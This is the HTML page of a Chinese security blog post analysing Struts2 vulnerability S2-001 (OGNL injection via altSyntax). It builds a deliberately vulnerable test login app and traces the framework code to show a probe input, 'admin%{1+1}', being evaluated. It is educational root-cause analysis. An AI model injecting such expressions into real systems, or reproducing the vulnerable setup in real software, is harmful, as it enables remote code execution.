@@ -1,0 +1,380 @@
+<!DOCTYPE html>
+
+<html lang="zh-CN">
+
+<head>
+    
+    <title>Struts2 vuln analysis - S2-001 - S0cke3t&#39;s Blog</title>
+    <meta charset="UTF-8">
+    <meta name="description" content="">
+    <meta name="keywords" content="">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5">
+    
+    
+
+    <link rel="shortcut icon" href="/favicon.ico" type="image/x-icon" />
+    <meta name="description" content="Struts2漏洞史分析-S2-001">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Struts2 vuln analysis - S2-001">
+<meta property="og:url" content="http://www.saferoad.cc/Analysis/Struts2-vuln-analysis-S2-001.html">
+<meta property="og:site_name" content="S0cke3t&#39;s Blog">
+<meta property="og:description" content="Struts2漏洞史分析-S2-001">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/DeEpinGh0st/BlogOSS/main/aticles/2021/09/04/202203281409220.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/DeEpinGh0st/BlogOSS/main/aticles/2021/09/04/202203281409652.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/DeEpinGh0st/BlogOSS/main/aticles/2021/09/04/202203281409004.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/DeEpinGh0st/BlogOSS/main/aticles/2021/09/04/202203281409487.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/DeEpinGh0st/BlogOSS/main/aticles/2021/09/04/202203281409204.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/DeEpinGh0st/BlogOSS/main/aticles/2021/09/04/202203281409392.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/DeEpinGh0st/BlogOSS/main/aticles/2021/09/04/202203281411846.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/DeEpinGh0st/BlogOSS/main/aticles/2021/09/04/202203281409381.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/DeEpinGh0st/BlogOSS/main/aticles/2021/09/04/202203281409343.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/DeEpinGh0st/BlogOSS/main/aticles/2021/09/04/202203281409192.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/DeEpinGh0st/BlogOSS/main/aticles/2021/09/04/202203281409114.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/DeEpinGh0st/BlogOSS/main/aticles/2021/09/04/202203281409567.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/DeEpinGh0st/BlogOSS/main/aticles/2021/09/04/202203281412131.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/DeEpinGh0st/BlogOSS/main/aticles/2021/09/04/202203281409897.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/DeEpinGh0st/BlogOSS/main/aticles/2021/09/04/202203281409375.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/DeEpinGh0st/BlogOSS/main/aticles/2021/09/04/202203281409301.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/DeEpinGh0st/BlogOSS/main/aticles/2021/09/04/202203281409984.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/DeEpinGh0st/BlogOSS/main/aticles/2021/09/04/202203281409139.png">
+<meta property="article:published_time" content="2021-06-07T06:07:19.000Z">
+<meta property="article:modified_time" content="2022-03-28T11:34:47.760Z">
+<meta property="article:author" content="S0cke3t">
+<meta property="article:tag" content="Java">
+<meta property="article:tag" content="Struts2">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/DeEpinGh0st/BlogOSS/main/aticles/2021/09/04/202203281409220.png">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/combine/npm/highlight.js@9.15.8/styles/atom-one-dark.css,npm/justifiedGallery@3.8.1/dist/css/justifiedGallery.min.css,gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css,npm/hexo-theme-nexmoe@latest/source/lib/mdui_043tiny/css/mdui.css,npm/hexo-theme-nexmoe@latest/source/lib/iconfont/iconfont.css?v=233" crossorigin>
+    <link rel="stylesheet" href="/css/style.css?v=1648475627150">
+    
+        <link rel="stylesheet" href="/css/dark.css?v=1648475627150">
+     
+    
+    <link rel="stylesheet" href="/lib/iconfont/iconfont.css?v=1648475627150">
+    
+<meta name="generator" content="Hexo 6.1.0"></head>
+
+<body class="mdui-drawer-body-left">
+    
+    <div id="nexmoe-background">
+        <div class="nexmoe-bg" style="background-image: url(https://raw.githubusercontent.com/DeEpinGh0st/BlogOSS/main/aticles/newbolg/202203272236776.jpg)"></div>
+        <div class="mdui-appbar mdui-shadow-0">
+            <div class="mdui-toolbar">
+                <a mdui-drawer="{target: '#drawer', swipe: true}" title="menu" class="mdui-btn mdui-btn-icon mdui-ripple"><i class="mdui-icon nexmoefont icon-menu"></i></a>
+                <div class="mdui-toolbar-spacer"></div>
+                <!--<a href="javascript:;" class="mdui-btn mdui-btn-icon"><i class="mdui-icon material-icons">search</i></a>-->
+                <a href="/" title="S0cke3t" class="mdui-btn mdui-btn-icon"><img src="https://raw.githubusercontent.com/DeEpinGh0st/BlogOSS/main/202203272159225.jpg" alt="S0cke3t"></a>
+            </div>
+        </div>
+    </div>
+    <div id="nexmoe-header">
+        <div class="nexmoe-drawer mdui-drawer" id="drawer">
+    <div class="nexmoe-avatar mdui-ripple">
+        <a href="/" title="S0cke3t">
+            <img src="https://raw.githubusercontent.com/DeEpinGh0st/BlogOSS/main/202203272159225.jpg" alt="S0cke3t" alt="S0cke3t">
+        </a>
+    </div>
+    <div class="nexmoe-count">
+        <div><span>文章</span>27</div>
+        <div><span>标签</span>19</div>
+        <div><span>分类</span>10</div>
+    </div>
+    <div class="nexmoe-list mdui-list" mdui-collapse="{accordion: true}">
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/" title="回到首页">
+            <i class="mdui-list-item-icon nexmoefont icon-home"></i>
+            <div class="mdui-list-item-content">
+                回到首页
+            </div>
+        </a>
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/archives.html" title="文章归档">
+            <i class="mdui-list-item-icon nexmoefont icon-container"></i>
+            <div class="mdui-list-item-content">
+                文章归档
+            </div>
+        </a>
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/aboutme.html" title="关于我">
+            <i class="mdui-list-item-icon nexmoefont icon-info-circle"></i>
+            <div class="mdui-list-item-content">
+                关于我
+            </div>
+        </a>
+        
+    </div>
+    <aside id="nexmoe-sidebar">
+    
+    <div class="nexmoe-widget-wrap">
+    <div class="nexmoe-widget nexmoe-search">
+         
+            <form id="search_form" action_e="https://cn.bing.com/search?q=site:saferoad.cc" onsubmit="return search();">
+                <label><input id="search_value" name="q" type="search" placeholder="搜索"></label>
+            </form>
+         
+    </div>
+</div>
+    
+    <div class="nexmoe-widget-wrap">
+    <div class="nexmoe-widget nexmoe-social">
+        <a class="mdui-ripple" href="https://github.com/DeEpinGh0st/" target="_blank" mdui-tooltip="{content: 'GitHub'}" style="color: rgb(255, 255, 255);background-color: rgba(25, 23, 23, .15);">
+            <i class="nexmoefont icon-github"></i>
+        </a>
+    </div>
+</div>
+    
+    
+  <div class="nexmoe-widget-wrap">
+    <h3 class="nexmoe-widget-title">文章分类</h3>
+    <div class="nexmoe-widget">
+
+      <ul class="category-list">
+
+        
+
+
+        
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/Analysis/">Analysis</a>
+          <span class="category-list-count">8</span>
+        </li>
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/Audit/">Audit</a>
+          <span class="category-list-count">1</span>
+        </li>
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/Bypass/">Bypass</a>
+          <span class="category-list-count">1</span>
+        </li>
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/CISP-PTE/">CISP-PTE</a>
+          <span class="category-list-count">2</span>
+        </li>
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/Case-share/">Case share</a>
+          <span class="category-list-count">1</span>
+        </li>
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/Crack/">Crack</a>
+          <span class="category-list-count">1</span>
+        </li>
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/Docker/">Docker</a>
+          <span class="category-list-count">1</span>
+        </li>
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/Emergency/">Emergency</a>
+          <span class="category-list-count">1</span>
+        </li>
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/Notes/">Notes</a>
+          <span class="category-list-count">4</span>
+        </li>
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/SecTool/">SecTool</a>
+          <span class="category-list-count">7</span>
+        </li>
+
+        
+      </ul>
+
+    </div>
+  </div>
+
+
+    
+    
+  <div class="nexmoe-widget-wrap">
+    <div id="randomtagcloud" class="nexmoe-widget tagcloud nexmoe-rainbow">
+      <a href="/tags/ASP-NET/" style="font-size: 13.33px;">ASP.NET</a> <a href="/tags/Csharp/" style="font-size: 20px;">Csharp</a> <a href="/tags/Domain-security/" style="font-size: 10px;">Domain security</a> <a href="/tags/Flink/" style="font-size: 10px;">Flink</a> <a href="/tags/Java/" style="font-size: 20px;">Java</a> <a href="/tags/Linux/" style="font-size: 10px;">Linux</a> <a href="/tags/PHP/" style="font-size: 13.33px;">PHP</a> <a href="/tags/Pentest/" style="font-size: 10px;">Pentest</a> <a href="/tags/Portainer/" style="font-size: 10px;">Portainer</a> <a href="/tags/Python/" style="font-size: 13.33px;">Python</a> <a href="/tags/SecTool/" style="font-size: 16.67px;">SecTool</a> <a href="/tags/Sectool/" style="font-size: 20px;">Sectool</a> <a href="/tags/Seeyon/" style="font-size: 10px;">Seeyon</a> <a href="/tags/Sqlmap/" style="font-size: 10px;">Sqlmap</a> <a href="/tags/Struts2/" style="font-size: 10px;">Struts2</a> <a href="/tags/ThinkPHP/" style="font-size: 10px;">ThinkPHP</a> <a href="/tags/Windows/" style="font-size: 13.33px;">Windows</a> <a href="/tags/WordPress/" style="font-size: 10px;">WordPress</a> <a href="/tags/solution/" style="font-size: 10px;">solution</a>
+    </div>
+    
+  </div>
+
+    
+</aside>
+    <div class="nexmoe-copyright">
+        &copy; 2022 S0cke3t
+        Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+        & <a href="https://github.com/theme-nexmoe/hexo-theme-nexmoe" target="_blank">Nexmoe</a>
+        <br/>Too Young Too Sample
+    </div>
+</div><!-- .nexmoe-drawer -->
+    </div>
+    <div id="nexmoe-content">
+        <div class="nexmoe-primary">
+            <div class="nexmoe-post">
+
+  <article>
+      
+          <div class="nexmoe-post-cover" style="padding-bottom: 66.66666666666666%;"> 
+              <img data-src="https://raw.githubusercontent.com/DeEpinGh0st/BlogOSS/main/aticles/newbolg/202203272236776.jpg" data-sizes="auto" alt="Struts2 vuln analysis - S2-001" class="lazyload">
+              <h1>Struts2 vuln analysis - S2-001</h1>
+          </div>
+      
+      
+      <div class="nexmoe-post-meta nexmoe-rainbow" style="margin:10px 0!important;">
+    <a><i class="nexmoefont icon-calendar-fill"></i>2021年06月07日</a>
+    <a><i class="nexmoefont icon-areachart"></i>1.7k 字</a>
+    <a><i class="nexmoefont icon-time-circle-fill"></i>大概 8 分钟</a>
+</div>
+
+      
+
+      <h4 id="Why-do-this"><a href="#Why-do-this" class="headerlink" title="Why do this"></a>Why do this</h4><p>关于Struts2漏洞出现到现在，网上很多大佬已经发表过分析此系列漏洞的优秀文章。这些文献足以为我们了解struts漏洞提供足够的参考。但为什么还要写这篇文章呢，以个人观点认为，一是为分析漏洞做一个留存，俗话说好记性不如烂笔头。二是作为一个web安全研究者，在对漏洞的研究时不能旦旦是拿工具来一把梭。不仅要知其然，还要知其所以然。本文是笔者第一次分析struts2相关漏洞，撰写本文时尽管参考了多位师傅[^1]的文章，但难免还是会有说明不到位的情况，如有不妥之处还请大佬们多多斧正。</p>
+<h4 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h4><blockquote>
+<p>此漏洞源于 Struts 2 框架中的一个标签处理功能： altSyntax。在开启时，支持对标签中的 OGNL 表达式进行解析并执行[struts2标签解析主要依赖于xwork2,可以理解为xwork2的漏洞]，攻击者通过使用 <code>%&#123;&#125;</code> 包裹恶意表达式的方式，将参数传递给应用程序，由于应用程序处理逻辑失误，导致了二次解析，造成了漏洞。</p>
+<p><em><strong>影响版本</strong></em></p>
+<p>WebWork 2.1 (with altSyntax enabled), WebWork 2.2.0 - WebWork 2.2.5, Struts 2.0.0 - Struts 2.0.8</p>
+<p>调试环境构建</p>
+<p>IDEA 2021.3<br>Struts2.0.5-all<br>Tomcat7.0.70<br>JDK7</p>
+</blockquote>
+<p>首先需要在IDEA中安装Struts2插件方便创建struts2应用程序<br><img src="https://raw.githubusercontent.com/DeEpinGh0st/BlogOSS/main/aticles/2021/09/04/202203281409220.png"><br>安装完成后重启IDEA，创建新项目，并设置tomcat<br><img src="https://raw.githubusercontent.com/DeEpinGh0st/BlogOSS/main/aticles/2021/09/04/202203281409652.png"><br>随后将下载的struts2包解压到自己能找到的路径<br><img src="https://raw.githubusercontent.com/DeEpinGh0st/BlogOSS/main/aticles/2021/09/04/202203281409004.png"><br>最后填写项目名称和项目路径即可，项目创建完成后。我们需要编写一个测试用例以便后面分析调试使用<br>在web目录下创建<br>index.jsp</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page language=<span class="string">&quot;java&quot;</span> contentType=<span class="string">&quot;text/html; charset=UTF-8&quot;</span>  </span><br><span class="line">  pageEncoding=<span class="string">&quot;UTF-8&quot;</span>%&gt;  </span><br><span class="line">&lt;%@ taglib prefix=<span class="string">&quot;s&quot;</span> uri=<span class="string">&quot;/struts-tags&quot;</span> %&gt;  </span><br><span class="line">&lt;!DOCTYPE html PUBLIC <span class="string">&quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot;</span> <span class="string">&quot;http://www.w3.org/TR/html4/loose.dtd&quot;</span>&gt;  </span><br><span class="line">&lt;html&gt;  </span><br><span class="line">&lt;head&gt;  </span><br><span class="line">  &lt;meta http-equiv=<span class="string">&quot;Content-Type&quot;</span> content=<span class="string">&quot;text/html; charset=UTF-8&quot;</span>&gt;  </span><br><span class="line">  &lt;title&gt;S2-<span class="number">001</span>&lt;/title&gt;  </span><br><span class="line">&lt;/head&gt;  </span><br><span class="line">&lt;body&gt;  </span><br><span class="line">&lt;h2&gt;S2-<span class="number">001</span>&lt;/h2&gt;  </span><br><span class="line">&lt;s:form action=<span class="string">&quot;login&quot;</span>&gt;  </span><br><span class="line">  &lt;s:textfield name=<span class="string">&quot;username&quot;</span> label=<span class="string">&quot;username&quot;</span> /&gt;  </span><br><span class="line">  &lt;s:textfield name=<span class="string">&quot;password&quot;</span> label=<span class="string">&quot;password&quot;</span> /&gt;  </span><br><span class="line">  &lt;s:submit&gt;&lt;/s:submit&gt;  </span><br><span class="line">&lt;/s:form&gt;  </span><br><span class="line">&lt;/body&gt;  </span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+<p>welcome.jsp</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page language=<span class="string">&quot;java&quot;</span> contentType=<span class="string">&quot;text/html; charset=UTF-8&quot;</span>  </span><br><span class="line">  pageEncoding=<span class="string">&quot;UTF-8&quot;</span>%&gt;  </span><br><span class="line">&lt;%@ taglib prefix=<span class="string">&quot;s&quot;</span> uri=<span class="string">&quot;/struts-tags&quot;</span> %&gt;  </span><br><span class="line">&lt;!DOCTYPE html PUBLIC <span class="string">&quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot;</span> <span class="string">&quot;http://www.w3.org/TR/html4/loose.dtd&quot;</span>&gt;  </span><br><span class="line">&lt;html&gt;  </span><br><span class="line">&lt;head&gt;  </span><br><span class="line">  &lt;meta http-equiv=<span class="string">&quot;Content-Type&quot;</span> content=<span class="string">&quot;text/html; charset=UTF-8&quot;</span>&gt;  </span><br><span class="line">  &lt;title&gt;S2-<span class="number">001</span>&lt;/title&gt;  </span><br><span class="line">&lt;/head&gt;  </span><br><span class="line">&lt;body&gt;  </span><br><span class="line">&lt;p&gt;Hello &lt;s:property value=<span class="string">&quot;username&quot;</span>&gt;&lt;/s:property&gt;&lt;/p&gt;  </span><br><span class="line">&lt;/body&gt;  </span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+<p>更改WEB-INF下web.xml</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">web-app</span> <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;</span> <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_3_1.xsd&quot;</span> <span class="attr">id</span>=<span class="string">&quot;WebApp_ID&quot;</span> <span class="attr">version</span>=<span class="string">&quot;3.1&quot;</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">display-name</span>&gt;</span>S2-001 Example<span class="tag">&lt;/<span class="name">display-name</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">filter</span>&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>struts2<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>org.apache.struts2.dispatcher.FilterDispatcher<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;/<span class="name">filter</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>struts2<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">welcome-file-list</span>&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;<span class="name">welcome-file</span>&gt;</span>index.jsp<span class="tag">&lt;/<span class="name">welcome-file</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;/<span class="name">welcome-file-list</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>在src目录下创建包<code>cc.saferoad.sction</code>,并创建一个LoginAction类<br>LoginAction.java</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> cc.saferoad.action;  </span><br><span class="line"><span class="comment">/*  </span></span><br><span class="line"><span class="comment">@auther S0cke3t  </span></span><br><span class="line"><span class="comment">@date 2021-06-03  </span></span><br><span class="line"><span class="comment">*/</span>  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> com.opensymphony.xwork2.ActionSupport;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LoginAction</span> <span class="keyword">extends</span> <span class="title class_">ActionSupport</span> &#123;  </span><br><span class="line">    <span class="keyword">private</span> <span class="type">String</span> <span class="variable">username</span> <span class="operator">=</span> <span class="literal">null</span>;  </span><br><span class="line">    <span class="keyword">private</span> <span class="type">String</span> <span class="variable">password</span> <span class="operator">=</span> <span class="literal">null</span>;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getUsername</span><span class="params">()</span> &#123;  </span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.username;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getPassword</span><span class="params">()</span> &#123;  </span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.password;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setUsername</span><span class="params">(String username)</span> &#123;  </span><br><span class="line">        <span class="built_in">this</span>.username = username;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setPassword</span><span class="params">(String password)</span> &#123;  </span><br><span class="line">        <span class="built_in">this</span>.password = password;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">  <span class="keyword">public</span> String <span class="title function_">execute</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        <span class="keyword">if</span> ((<span class="built_in">this</span>.username.isEmpty()) || (<span class="built_in">this</span>.password.isEmpty())) &#123;  </span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;error&quot;</span>;  </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="keyword">if</span> ((<span class="built_in">this</span>.username.equalsIgnoreCase(<span class="string">&quot;admin&quot;</span>))  </span><br><span class="line">                &amp;&amp; (<span class="built_in">this</span>.password.equals(<span class="string">&quot;admin&quot;</span>))) &#123;  </span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;success&quot;</span>;  </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;error&quot;</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>最后更改src目录下的struts.xml</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span> ?&gt;</span>  </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">struts</span> <span class="keyword">PUBLIC</span>  </span></span><br><span class="line"><span class="meta">  <span class="string">&quot;-//Apache Software Foundation//DTD Struts Configuration 2.0//EN&quot;</span>  </span></span><br><span class="line"><span class="meta"> <span class="string">&quot;http://struts.apache.org/dtds/struts-2.0.dtd&quot;</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">struts</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">package</span> <span class="attr">name</span>=<span class="string">&quot;S2-001&quot;</span> <span class="attr">extends</span>=<span class="string">&quot;struts-default&quot;</span>&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;<span class="name">action</span> <span class="attr">name</span>=<span class="string">&quot;login&quot;</span> <span class="attr">class</span>=<span class="string">&quot;cc.saferoad.action.LoginAction&quot;</span>&gt;</span>  </span><br><span class="line">            <span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">&quot;success&quot;</span>&gt;</span>welcome.jsp<span class="tag">&lt;/<span class="name">result</span>&gt;</span>  </span><br><span class="line">            <span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">&quot;error&quot;</span>&gt;</span>index.jsp<span class="tag">&lt;/<span class="name">result</span>&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;/<span class="name">action</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;/<span class="name">package</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">struts</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>准备完毕后，启动项目。<br><img src="https://raw.githubusercontent.com/DeEpinGh0st/BlogOSS/main/aticles/2021/09/04/202203281409487.png"></p>
+<h4 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>根据web.xml中配置的过滤器,程序首先会调用<code>org.apache.struts2.dispatcher.FilterDispatcher</code>的dofilter。<br>跟进<br><img src="https://raw.githubusercontent.com/DeEpinGh0st/BlogOSS/main/aticles/2021/09/04/202203281409204.png"><br>dofilter首先获取到当前HttpServletRequest，HttpServletResponse，ServletContext。随后调用dispatcher.serviceAction，跟进<br><img src="https://raw.githubusercontent.com/DeEpinGh0st/BlogOSS/main/aticles/2021/09/04/202203281409392.png"><br>serviceaction通过createContextMap将获取到的request,response,context放入extraContext中，随后使用ActionProxyFactory实例化一个Actionproxy动作代理。最后调用proxy的execut方法<br>接下来struts2会加载一系列的拦截器，其中我们需要重点关注的是ParametersInterceptor，此拦截器负责接收我们传入的参数。在加载完拦截器后，会调用invocation.invoke(也就是DefaultActionInvocation 的 <code>invoke()</code>)<br><img src="https://raw.githubusercontent.com/DeEpinGh0st/BlogOSS/main/aticles/2021/09/04/202203281411846.png"><br>跟进<br><img src="https://raw.githubusercontent.com/DeEpinGh0st/BlogOSS/main/aticles/2021/09/04/202203281409381.png"><br>invoke中会调用invokeActionOnly,跟进<br><img src="https://raw.githubusercontent.com/DeEpinGh0st/BlogOSS/main/aticles/2021/09/04/202203281409343.png"><br>invokeActionOnly接着调用自身invokeaction，继续跟进<br><img src="https://raw.githubusercontent.com/DeEpinGh0st/BlogOSS/main/aticles/2021/09/04/202203281409192.png"><br>invokeaction通过反射方式调用用户action里的execute，开始处理用户层逻辑。在处理完用户逻辑后会调用DefaultActionInvocation 的executeResult处理请求结果，跟进<br><img src="https://raw.githubusercontent.com/DeEpinGh0st/BlogOSS/main/aticles/2021/09/04/202203281409114.png"></p>
+<p>executeResult会调用result实现类的execute进行处理，随后struts会调用具体实现类<code>ComponentTagSupport</code>进行标签的解析<br>标签的开始和结束位置，会分别调用 <code>doStartTag()</code> 及 <code>doEndTag()</code> 方法<br><img src="https://raw.githubusercontent.com/DeEpinGh0st/BlogOSS/main/aticles/2021/09/04/202203281409567.png"><br>而造成此次漏洞的正是doEndTag,直接跟进doEndTag，doEndTag会接着调用components的end<br>方法，end会调用自身evaluateParams<br><img src="https://raw.githubusercontent.com/DeEpinGh0st/BlogOSS/main/aticles/2021/09/04/202203281412131.png"></p>
+<p><img src="https://raw.githubusercontent.com/DeEpinGh0st/BlogOSS/main/aticles/2021/09/04/202203281409897.png"><br>其中会判断altSyntax是否开启，如果开启会对参数值进行重新组合，随后调用addparameter,跟进其中的findvalue<br><img src="https://raw.githubusercontent.com/DeEpinGh0st/BlogOSS/main/aticles/2021/09/04/202203281409375.png"><br><img src="https://raw.githubusercontent.com/DeEpinGh0st/BlogOSS/main/aticles/2021/09/04/202203281409301.png"></p>
+<p>findvalue会调用translateVariables取出最外层的{},此时expression的值为admin%{1+1},随后进入下一个while循环再次确定{}位置，在经过expression.substring时var的值为1+1。最后传入stack.findValue，执行表达式</p>
